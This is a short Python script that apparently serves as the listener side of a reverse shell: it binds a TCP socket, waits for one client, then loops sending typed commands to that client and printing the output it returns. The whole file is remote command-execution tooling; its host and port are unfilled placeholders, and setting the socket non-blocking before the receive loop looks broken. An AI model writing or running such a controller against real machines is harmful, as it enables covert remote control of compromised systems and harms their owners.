import socket

HOST = IP
PORT = PORT
server = socket.socket()

server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
server.setblocking(False)
print(f'[+] {client_addr} Client connected to the server')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(57785)
    output = output.decode()
    print(f"Output: {output}")